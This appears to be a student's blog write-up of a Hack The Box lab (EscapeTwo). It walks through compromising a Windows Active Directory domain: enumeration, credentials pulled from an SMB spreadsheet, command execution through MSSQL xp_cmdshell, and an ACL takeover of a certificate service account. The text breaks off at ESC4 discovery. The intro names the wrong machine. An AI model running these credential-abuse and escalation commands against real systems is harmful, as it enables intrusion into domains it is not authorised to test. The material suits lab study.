<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="x5-fullscreen" content="true">
<meta name="full-screen" content="yes">
<meta name="theme-color" content="#317EFB" />
<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
<meta name="description" content="Table of Contents Initial Enumeration with Nmap Step 2: Enumeration services Step 3: foothhold  Step 4: Privilege Escalation Key takeaways  In this write-up, we will walk through the steps to compromi">
<meta property="og:type" content="article">
<meta property="og:title" content="EscapeTwo">
<meta property="og:url" content="http://0xdezznutz.github.io/EscapeTwo/">
<meta property="og:site_name" content="NUTZH">
<meta property="og:description" content="Table of Contents Initial Enumeration with Nmap Step 2: Enumeration services Step 3: foothhold  Step 4: Privilege Escalation Key takeaways  In this write-up, we will walk through the steps to compromi">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://0xdezznutz.github.io/img/404.jpg">
<meta property="article:published_time" content="2025-01-12T15:40:05.080Z">
<meta property="article:modified_time" content="2025-01-12T17:44:21.005Z">
<meta property="article:author" content="NUTZH">
<meta property="article:tag" content="HACK THE BOX">
<meta property="article:tag" content="WINDOWS">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="PENETRATION TESTING">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://0xdezznutz.github.io/img/404.jpg">

    <meta name="keywords" content="HACKTHEBOX,CTF,SECURITY, NETWORK , PENTEST , WEBexploit , TRYHACKME , CHEATSHEET , LINUX , WINDOWS">


<title >EscapeTwo</title>

<!-- Favicon -->

    <link href='/favico.png?v=2.2.4' rel='icon' type='image/png' sizes='16x16' ></link>


    <link href='/favico.png?v=2.2.4' rel='icon' type='image/png' sizes='32x32' ></link>


    <link href='/apple-touch-icon.png?v=2.2.4' rel='apple-touch-icon' sizes='180x180' ></link>


    <link href='/site.webmanifest' rel='manifest' ></link>


<!-- Plugin -->




    
<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">

    
<link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.css">

    
    




<!-- Icon -->

    
<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">




<!-- Variable -->
<script>window.ASYNC_CONFIG = {"hostname":"0xdezznutz.github.io","author":"NUTZH","root":"/","typed_text":["Cybersecurity Student"],"theme_version":"2.2.4","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"favico.png","icon16":"favico.png","icon32":"favico.png","apple_touch_icon":"apple-touch-icon.png","webmanifest":"/site.webmanifest","visibilitychange":true,"hidden":"favico.png","show_text":"(/≧▽≦/)","hide_text":"(●—●)"},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms","author":"Post author: ","copyright_link":"Post link: ","copyright_license_title":"Copyright Notice: ","copyright_license_content":"All articles in this blog are licensed under undefined unless otherwise stated.","copy_success":"Copied","copy_failure":"Copy failed","open_read_mode":"Enter reading mode","exit_read_mode":"Exit reading mode","notice_outdate_message":"It has been undefined days since the last update, the content of the article may be outdated.","sticky":"TOP","just":"Just","min":"minutes ago","hour":"hours ago","day":"days ago","month":"months ago"},"swup":false,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"mac","height_limit":false},"toc":{"post_title":true},"live_time":{"start_time":"","prefix":"The blog has been lovely to run undefined day"},"danmu":{"enable":false,"el":".trm-banner"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2025-01-12 18:44:21"};</script>

<!-- Theme mode css -->
<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.4" id="trm-switch-style">
<script>
    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
    let type = catchMode === 'style-dark' ? 'add' : 'remove';
    document.documentElement.classList[type]('dark')
</script>

<!-- CDN -->


    
    



<!-- Site Analytics -->


     

    
        <!-- Google Analytics -->
        <script async src='https://www.googletagmanager.com/gtag/js?id=G-77TF3MK6G4'></script>
        <script defer>
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-77TF3MK6G4');
        </script>
    

    
 
<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="NUTZH" type="application/atom+xml">
</head>

<body>

  <!-- app wrapper -->
  <div class="trm-app-frame">

    <!-- page preloader -->
    <div class="trm-preloader">
    <div class="trm-holder">
        <div class="preloader">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
</div>
    <!-- page preloader end -->

    <!-- change mode preloader -->
    <div class="trm-mode-swich-animation-frame">
    <div class="trm-mode-swich-animation">
        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
        <div class="trm-horizon"></div>
        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
    </div>
</div>
    <!-- change mode preloader end -->

      <!-- scroll container -->
      <div id="trm-dynamic-content" class="trm-swup-animation">
        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
            <!-- top bar -->
            <header class="trm-top-bar">
	<div class="container">
		<div class="trm-left-side">
			<!-- logo -->
<a href="/" class="trm-logo-frame trm-anima-link">
    
        <img alt="logo" src="/favico.png">
    
    
        <div class="trm-logo-text">
            NUTZH<span>NOTE</span>
        </div>
    
</a>
<!-- logo end -->
		</div>
		<div class="trm-right-side">
			<!-- menu -->
<div class="trm-menu">
    <nav>
        <ul>
            
            <li class="menu-item-has-children ">
                <a  href="/" target="">
                    home
                </a>
                
            </li>
            
            <li class="menu-item-has-children ">
                <a  href="/archives/" target="">
                    TimeLine
                </a>
                
            </li>
            
            <li class="menu-item-has-children ">
                <a data-no-swup href="/projects/" target="">
                    projects
                </a>
                
            </li>
            
            <li class="menu-item-has-children ">
                <a  href="/about/" target="">
                    about
                </a>
                
            </li>
            
        </ul>
    </nav>
</div>
<!-- menu end -->
			
    <!-- mode switcher place -->
    <div class="trm-mode-switcher-place">
        <div class="trm-mode-switcher">
            <i class="iconfont far fa-sun"></i>
            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
            <label class="trm-swich" for="trm-swich"></label>
            <i class="iconfont far fa-moon"></i>
        </div>
    </div>
    <!-- mode switcher place end -->

			
    
    <div id="trm-search-btn" class="trm-search-btn">
        <i class="iconfont fas fa-search"></i>
    </div>
     

		</div>
		<div class="trm-menu-btn">
			<span></span>
		</div>
	</div>
</header>
            <!-- top bar end -->

            <!-- body -->
            
<div class="trm-content-start">
    <!-- banner -->
    <div class="trm-banner">
    
    <!-- banner cover -->
    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="https://wallpapercave.com/wp/wp5134015.jpg">
    <!-- banner cover end -->
    

    <!-- banner content -->
    <div class="trm-banner-content trm-overlay">
        <div class="container">
            <div class="row">
                
                <div class="col-lg-4"></div>
                
                <div class="col-lg-8">

                    <!-- banner title -->
                    <div class="trm-banner-text ">
                        <div class="trm-label trm-mb-20">
                            EscapeTwo
                        </div>
                        <h1 class="trm-mb-30 trm-hsmb-font">
                            EscapeTwo
                        </h1>

                        
                            <ul class="trm-breadcrumbs trm-label">
                                <li>
                                    <a href="/" class="trm-anima-link">Home</a>
                                </li>
                                <li>
                                    <span>
                                        EscapeTwo
                                    </span>
                                </li>
                            </ul>
                        
                    </div>
                    <!-- banner title end -->

                    <!-- scroll hint -->
                    <span id="scroll-triger" class="trm-scroll-hint-frame">
                        <div class="trm-scroll-hint"></div>
                        <span class="trm-label">Scroll down</span>
                    </span>
                    <!-- scroll hint end -->

                </div>
            </div>
        </div>
    </div>
    <!-- banner content end -->
</div>
    <!-- banner end -->
    <div class="container">
        <div class="row">
            
                <div class="trm-page-sidebar col-lg-4 hidden-sm">
                    <!-- main card -->
                    <div class="trm-main-card-frame trm-sidebar">
    <div class="trm-main-card"> 
        <!-- card header -->
<div class="trm-mc-header">
    <div class="trm-avatar-frame trm-mb-20">
        <img alt="Avatar" class="trm-avatar" src="https://image.cdn2.seaart.me/2023-07-22/47696317661253/37482c38198763e17698578f71a61a0f0f151ae5_high.webp">
    </div>
    <h5 class="trm-name trm-mb-15">
        NUTZH
    </h5>
    
        <div class="trm-label">
            I`m
            <span class="trm-typed-text">
                <!-- Words for theme.user.typedText -->
            </span>
        </div>
    
</div>
<!-- card header end -->
        <!-- sidebar social -->

<div class="trm-divider trm-mb-40 trm-mt-40"></div>
<div class="trm-social">
    
        <a href="https://github.com/0xDEZZNUTZ" title="github" rel="nofollow" target="_blank">
            <i class="iconfont fab fa-github"></i>
        </a>
    
        <a href="https://www.linkedin.com/in/youssef-k-ab87061ba/" title="linkdin" rel="nofollow" target="_blank">
            <i class="iconfont fab fa-linkedin"></i>
        </a>
    
        <a href="https://www.instagram.com/deez.nutz_lh/" title="instagram" rel="nofollow" target="_blank">
            <i class="iconfont fab fa-instagram"></i>
        </a>
    
</div>

<!-- sidebar social end -->
        <!-- info -->
<div class="trm-divider trm-mb-40 trm-mt-40"></div>
<ul class="trm-table trm-mb-20">
    
        <li>
            <div class="trm-label">
                whoami:
            </div>
            <div class="trm-label trm-label-light">
                YOUSSEF.K
            </div>
        </li>
    
        <li>
            <div class="trm-label">
                age:
            </div>
            <div class="trm-label trm-label-light">
                20
            </div>
        </li>
    
        <li>
            <div class="trm-label">
                address:
            </div>
            <div class="trm-label trm-label-light">
                earth
            </div>
        </li>
    
</ul>
<!-- info end -->

        
    <div class="trm-divider trm-mb-40 trm-mt-40"></div>
    <!-- action button -->
    <div class="text-center">
        <a href="mailto:0xnutzh@gmail.com" class="trm-btn" style="
            background: linear-gradient(135deg, #6e8efb, #4a6cf7);
            color: white;
            padding: 12px 24px;
            border-radius: 25px;
            text-decoration: none;
            font-size: 16px;
            font-weight: bold;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        ">
            E-mail me
            <i class="iconfont far fa-envelope"></i>
        </a>
    </div>
    <!-- action button end -->

    </div>
</div>


                    <!-- main card end -->
                </div>
            
            <div class="trm-page-content col-lg-8">
                <div id="trm-content" class="trm-content">
                    <div class="trm-post-info row hidden-sm">
    <div class="col-sm-4">
        <div class="trm-card trm-label trm-label-light text-center">
            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
            01/12
        </div>
    </div>
    <div class="col-sm-4">
        <div class="trm-card trm-label trm-label-light text-center">
            <i class="iconfont far fa-clock trm-icon"></i><br>
            16:40
        </div>
    </div>
    <div class="col-sm-4">
        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
            <i class="iconfont far fa-user trm-icon"></i><br>
            NUTZH
        </div>
    </div>
</div>
<div class="trm-card ">
    <article id="article-container" class="trm-publication">
    <h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ol>
<li><a href="#initial-enumeration-with-nmap">Initial Enumeration with Nmap</a></li>
<li><a href="#step-2-Enumeration-services">Step 2: Enumeration services</a></li>
<li><a href="#step-3-foothhold">Step 3: foothhold </a></li>
<li><a href="#step-4privilege-escalation">Step 4: Privilege Escalation</a></li>
<li><a href="key-takeaways">Key takeaways</a></li>
</ol>
<p>In this write-up, we will walk through the steps to compromise the Cicada machine on Hack The Box. The machine involves exploiting a Windows Active Directory environment with multiple services running, including SMB, LDAP, and Microsoft SQL Server. We will leverage misconfigurations, weak credentials, and privilege escalation techniques to gain administrative access and retrieve the root flag.</p>
<h2 id="Initial-Enumeration-with-Nmap"><a href="#Initial-Enumeration-with-Nmap" class="headerlink" title="Initial Enumeration with Nmap"></a>Initial Enumeration with Nmap</h2><p>We started by performing a port scan using Nmap to identify open ports and services running on the target machine.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sV 10.10.11.51 </span><br><span class="line">nmap -sV 10.10.11.51                                                                           </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 16:43 +01</span><br><span class="line">Nmap scan report <span class="keyword">for</span> sequel.htb (10.10.11.51)</span><br><span class="line">Host is up (0.066s latency).</span><br><span class="line">Not shown: 988 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-01-12 15:44:14Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 56.92 seconds</span><br></pre></td></tr></table></figure>
<h2 id="Key-Findings"><a href="#Key-Findings" class="headerlink" title="Key Findings:"></a>Key Findings:</h2><ul>
<li><p><strong>SMB (Port 445)</strong></p>
<ul>
<li>Potentially exploitable for file shares</li>
</ul>
</li>
<li><p><strong>LDAP (Ports 389, 636)</strong> </p>
<ul>
<li>Active Directory services running</li>
</ul>
</li>
<li><p><strong>MSSQL (Port 1433)</strong></p>
<ul>
<li>Microsoft SQL Server</li>
<li>Potential vector for exploitation</li>
</ul>
</li>
<li><p><strong>Initial Credentials</strong></p>
<ul>
<li>Username: rose </li>
<li>Password: KxEPkKe6R8su</li>
</ul>
</li>
</ul>
<h2 id="Enumeration-services"><a href="#Enumeration-services" class="headerlink" title="Enumeration services"></a>Enumeration services</h2><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>Using <span style="color:red; font-size:medium;">Bloodhound</span>, we enumerated the Active Directory environment to identify potential attack paths.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap sequel.htb -u rose  -p KxEPkKe6R8su  --bloodhound --collection All --dns-server 10.10.11.51</span><br><span class="line">SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        10.10.11.51     389    DC01             [+] sequel.htb\rose:KxEPkKe6R8su </span><br><span class="line">LDAP        10.10.11.51     389    DC01             Resolved collection methods: localadmin, trusts, objectprops, container, psremote, group, dcom, acl, rdp, session</span><br><span class="line">LDAP        10.10.11.51     389    DC01             Done <span class="keyword">in</span> 00M 10S</span><br><span class="line">LDAP        10.10.11.51     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.10.11.51_2025-01-12_164518_bloodhound.zip</span><br></pre></td></tr></table></figure>
<p>This generated a <span style="color:red; font-size:medium;">Bloodhound</span> ZIP file, which we analyzed in the <span style="color:red; font-size:medium;">Bloodhound</span> GUI.</p>
<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>We used netexec to enumerate SMB shares and discovered a share named Accounting Department.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb sequel.htb -u rose  -p KxEPkKe6R8su  --shares                      </span><br><span class="line">SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su </span><br><span class="line">SMB         10.10.11.51     445    DC01             [*] Enumerated shares</span><br><span class="line">SMB         10.10.11.51     445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.51     445    DC01             -----           -----------     ------</span><br><span class="line">SMB         10.10.11.51     445    DC01             Accounting Department READ            </span><br><span class="line">SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.51     445    DC01             C$                              Default share</span><br><span class="line">SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share </span><br><span class="line">SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share </span><br><span class="line">SMB         10.10.11.51     445    DC01             Users           READ </span><br></pre></td></tr></table></figure>
<p>we got the Accounting Department share</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient -U sequel.htb/rose%KxEPkKe6R8su //10.10.11.51/<span class="string">&#x27;Accounting Department&#x27;</span></span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Sun Jun  9 11:52:21 2024</span><br><span class="line">  ..                                  D        0  Sun Jun  9 11:52:21 2024</span><br><span class="line">  accounting_2024.xlsx                A    10217  Sun Jun  9 11:14:49 2024</span><br><span class="line">  accounts.xlsx                       A     6780  Sun Jun  9 11:52:07 2024</span><br></pre></td></tr></table></figure>
<p>We accessed the Accounting Department share and found two Excel files:</p>
<ul>
<li><code>accounting_2024.xlsx</code></li>
<li><code>accounts.xlsx</code></li>
</ul>
<p>After analyzing these files, we extracted the following credentials:</p>
<ul>
<li><strong>Angela Martin:</strong> <code>angela:0fwz7Q4mSpurIt99</code></li>
<li><strong>Oscar Martinez:</strong> <code>oscar:86LxLBMgEWaKUnBG</code></li>
<li><strong>Kevin Malone:</strong> <code>kevin:Md9Wlq1E5bZnVDVo</code></li>
<li><strong>SQL SA Account:</strong> <code>sa:MSSQLP@ssw0rd!</code></li>
</ul>
<h3 id="Exploiting-MSSQL"><a href="#Exploiting-MSSQL" class="headerlink" title="Exploiting MSSQL"></a>Exploiting MSSQL</h3><p>Using the sa credentials, we connected to the MSSQL server and enabled xp_cmdshell to execute commands on the system.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 mssqlclient.py <span class="string">&#x27;sequel.htb/sa:MSSQLP@ssw0rd!@10.10.11.51&#x27;</span> </span><br><span class="line">SQL (sa  dbo@master)&gt; SQL (sa  dbo@master)&gt; enable_xp_cmdshell</span><br><span class="line">INFO(DC01\SQLEXPRESS): Line 185: Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">INFO(DC01\SQLEXPRESS): Line 185: Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br></pre></td></tr></table></figure>
<h4 id="Steps"><a href="#Steps" class="headerlink" title="Steps:"></a>Steps:</h4><ol>
<li>Enabled xp_cmdshell if not :<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># enable xp_cmdshell</span></span><br><span class="line">EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure></li>
<li>Extracted the SQL Server service account password from the configuration file:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL (sa  dbo@master)&gt; EXEC xp_cmdshell <span class="string">&#x27;type C:\SQL2019\ExpressAdv_ENU\sql-configuration.INI&#x27;</span>;</span><br><span class="line">output                                              </span><br><span class="line">-------------------------------------------------   </span><br><span class="line">[OPTIONS]                                           </span><br><span class="line">SQLSVCPASSWORD=<span class="string">&quot;WqSZAF6CysDQbGb3&quot;</span>                   </span><br></pre></td></tr></table></figure>
<p>We tested this password with the user ryan and successfully authenticated via WinRM.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec winrm 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 </span><br><span class="line">SMB         10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)</span><br><span class="line">HTTP        10.10.11.51     5985   DC01             [*] http://10.10.11.51:5985/wsman</span><br><span class="line"></span><br><span class="line">WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)</span><br></pre></td></tr></table></figure>
<p>and from this u can read the user flag </p>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Using <span style="color:red; font-size:medium;">Bloodhound</span>, we identified that the user ryan had WriteOwner permissions over the CA_SVC account. We exploited this to take ownership of the account and grant ourselves FullControl.<br><img src="/../images/ryan.png" alt="BloodHound Analysis"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<h4 id="steps"><a href="#steps" class="headerlink" title="steps:"></a>steps:</h4><ol>
<li>Changed ownership of CA_SVC to ryan:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 owneredit.py -action write -new-owner <span class="string">&#x27;ryan&#x27;</span> -target <span class="string">&#x27;ca_svc&#x27;</span> <span class="string">&#x27;sequel.htb&#x27;</span>/<span class="string">&#x27;ryan&#x27;</span>:<span class="string">&#x27;WqSZAF6CysDQbGb3&#x27;</span> -dc-ip 10.10.11.51</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Current owner information below</span><br><span class="line">[*] - SID: S-1-5-21-548670397-972687484-3496335370-1114</span><br><span class="line">[*] - sAMAccountName: ryan</span><br><span class="line">[*] - distinguishedName: CN=Ryan Howard,CN=Users,DC=sequel,DC=htb</span><br><span class="line">[*] OwnerSid modified successfully!</span><br></pre></td></tr></table></figure></li>
<li>Granted FullControl to ryan:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -principal <span class="string">&#x27;ryan&#x27;</span> -target <span class="string">&#x27;ca_svc&#x27;</span> <span class="string">&#x27;sequel.htb&#x27;</span>/<span class="string">&#x27;ryan&#x27;</span>:<span class="string">&#x27;WqSZAF6CysDQbGb3&#x27;</span></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] DACL backed up to dacledit-20250112-171528.bak</span><br><span class="line">[*] DACL modified successfully!</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>Changed the password for CA_SVC:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc password <span class="string">&quot;CA_SVC&quot;</span> <span class="string">&quot;123456789&quot;</span> -U <span class="string">&quot;sequel.htb&quot;</span>/<span class="string">&quot;ryan&quot;</span>%<span class="string">&quot;WqSZAF6CysDQbGb3&quot;</span> -S <span class="string">&quot;sequel.htb&quot;</span></span><br></pre></td></tr></table></figure>
so the the credantials become CA_SVC:123456789</li>
</ol>
<h3 id="Exploiting-ESC4-Vulnerability"><a href="#Exploiting-ESC4-Vulnerability" class="headerlink" title="Exploiting ESC4 Vulnerability"></a>Exploiting ESC4 Vulnerability</h3><p>Using <span style="color:red; font-size:medium;">certipy</span>, we identified an ESC4 vulnerability in the DunderMifflinAuthentication certificate template. We modified the template to allow enrollment for the Administrator account.</p>
<h4 id="Steps-1"><a href="#Steps-1" class="headerlink" title="Steps:"></a>Steps:</h4><ol>
<li>find the vulnerability the certificate template:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad find -u <span class="string">&#x27;CA_SVC@SEQUEL.HTB&#x27;</span> -p <span class="string">&#x27;123456789&#x27;</span> -dc-ip 10.10.11.51</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC01-CA&#x27;</span> via CSRA</span><br><span class="line">[!] Got error <span class="keyword">while</span> trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC01-CA&#x27;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC01-CA&#x27;</span> via RRP</span><br><span class="line">[*] Got CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC01-CA&#x27;</span></span><br><span class="line">[*] Saved BloodHound data to <span class="string">&#x27;20250112171842_Certipy.zip&#x27;</span>. Drag and drop the file into the BloodHound GUI from @ly4k</span><br><span class="line">[*] Saved text output to <span class="string">&#x27;20250112171842_Certipy.txt&#x27;</span></span><br><span class="line">[*] Saved JSON output to <span class="string">&#x27;20250112171842_Certipy.json&#x27;</span></span><br></pre></td></tr></table></figure>
